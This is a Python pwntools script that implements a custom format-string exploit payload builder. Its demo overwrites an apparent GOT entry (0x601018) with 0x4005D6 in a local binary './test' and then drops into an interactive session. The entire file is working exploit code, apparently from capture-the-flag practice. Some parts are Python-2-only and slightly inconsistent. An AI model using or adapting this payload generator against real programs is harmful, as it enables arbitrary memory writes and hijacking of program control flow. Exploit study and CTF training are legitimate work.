from pwn import *


def new_fmtstr_payload(offset, writes, numbwritten=0, write_size='byte', bits=context.bits):
    from math import pow

    def get_payload(offset, chunk_list, numbwritten, write_size):
        format_n = {
            4: 'n',
            2: 'hn',
            1: 'hhn'
        }[write_size]
        written = numbwritten
        payload = ''
        for i in range(len(chunk_list)):
            if written > chunk_list[i][1]:
                written -= pow(256, write_size)
            if written == chunk_list[i][1]:
                payload += '%' + str(offset + i) + '$' + format_n
            else:
                payload += '%' + \
                    str(chunk_list[i][1] - written) + 'c' + \
                    '%' + str(offset + i) + '$' + format_n
            written = chunk_list[i][1]
        return payload

    write_size = {
        'int': 4,
        'short': 2,
        'byte': 1
    }[write_size]
    rwrites = dict(zip(writes.values(), writes.keys()))
    write_list = list(writes.items())
    chunk_list = []
    for i in range(len(write_list)):
        for _ in range((bits // 8) // write_size):
            addr = write_list[i][0] + write_size * _
            value = (write_list[i][1] >> (
                write_size * 8 * _)) % (1 << (write_size * 8))
            chunk_list.append((addr, value))
            #chunk_list.append((hex(addr), hex(value)))
    # print(chunk_list)
    # return

    chunk_list.sort(cmp=lambda chunk1, chunk2: chunk1[1] - chunk2[1])

    # guess payload
    new_offset = offset
    while True:
        payload = get_payload(new_offset, chunk_list, numbwritten, write_size)
        payload += 'a' * ((-len(payload) % (bits // 8)) % (bits // 8))
        if (len(payload) + numbwritten) // (bits // 8) == new_offset - offset:
            break
        new_offset += 1


    print(len(payload))
    for chunk in chunk_list:
        if bits == 32:
            payload += p32(chunk[0])
        elif bits == 64:
            payload += p64(chunk[0])

    log.info('payload=' + repr(payload))
    return payload


if __name__ == '__main__':
    writes = {0x08041337:   0xbfffffff,
              0x08041337 + 4: 0x1337babe,
              0x08041337 + 8: 0xdeadbeef}
    writes = {
        0x601018: 0x4005D6
    }
    payload = new_fmtstr_payload(6, writes, bits=64, write_size='short')
    log.info('payload=%s' % repr(payload))
    p = process('./test')
    p.send(payload)
    input('')
    p.interactive()
